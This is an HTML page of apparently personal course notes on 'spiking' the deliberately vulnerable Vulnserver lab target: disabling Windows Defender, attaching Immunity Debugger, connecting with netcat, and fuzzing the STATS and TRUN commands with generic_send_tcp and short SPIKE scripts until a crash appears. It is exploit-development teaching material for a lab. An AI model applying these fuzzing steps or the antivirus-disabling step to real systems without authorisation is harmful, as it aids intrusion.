<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Spiking</title>
</head><body>Disable Windows Real Time protection if that's enabled Cuz if we don't do it than it will block the Vulnserver will actually be blocked by windows defender.<br/>
<br/>
Imunity-Debuger<br/>
Files -&gt; Attach -&gt; Vulnserver<br/>
<img height="209" src="image.png" width="450"/><br/>
<br/>
It's Paused (i.e. bottom right side) and will hit start<br/>
<br/>
Kali Linux :<br/>
Will connect to Vulnserver and by default Vulnserver run on Port 9999 and the IP address of Windows machine on which it is running.<br/>
<br/>
──(root㉿kali)-[/home/kali]<br/>
└─# nc -nv 192.168.205.135 9999<br/>
(UNKNOWN) [192.168.205.135] 9999 (?) open<br/>
Welcome to Vulnerable Server! Enter HELP for help.<br/>
HELP<br/>
Valid Commands:<br/>
HELP<br/>
STATS [stat_value]<br/>
RTIME [rtime_value]<br/>
LTIME [ltime_value]<br/>
SRUN [srun_value]<br/>
TRUN [trun_value]<br/>
GMON [gmon_value]<br/>
GDOG [gdog_value]<br/>
KSTET [kstet_value]<br/>
GTER [gter_value]<br/>
HTER [hter_value]<br/>
LTER [lter_value]<br/>
KSTAN [lstan_value]<br/>
EXIT<br/>
<br/>
Vulnserver takes these commands (i.e. mentioned above as input) and the primary command that will focus on is Trun command.So will do something called as Spiking to find the Trun command<br/>
Tool that we will use to spike is Generic Send TCP<br/>
<br/>
┌──(root㉿kali)-[/home/kali]<br/>
└─# generic_send_tcp <br/>
argc=1<br/>
Usage: ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR<br/>
./generic_send_tcp 192.168.1.100 701 something.spk 0 0<br/>
<br/>
┌──(root㉿kali)-[/home/kali]<br/>
└─# cat stats.spk    <br/>
s_readline(); will read the line <br/>
s_string(&quot;STATS&quot;); and will take a string and the string is STATS and will send variables at it<br/>
s_string_variable(&quot;0&quot;); When will spike it will send the variables in all forms of iterations so might send thousand at a time and than 20 K and so on<br/>
<br/>
In the real test will let it run all the way through but the mentor told it's not vulnerable so will press ctrl + c to stop it<br/>
Will run the trun.spk now<br/>
<br/>
┌──(root㉿kali)-[/home/kali]<br/>
└─# cat trun.spk<br/>
s_readline();<br/>
s_string(&quot;TRUN &quot;);<br/>
s_string_variable(&quot;0&quot;);<br/>
                                                                              <br/>
┌──(root㉿kali)-[/home/kali]<br/>
└─# generic_send_tcp 192.168.205.135 9999 trun.spk 0 0<br/>
<br/>
<img height="280" src="image 2.png" width="600"/><br/>
<br/>
As we can see there is something vulnerable here but will see if we are able to control the EIP register or not</body></html>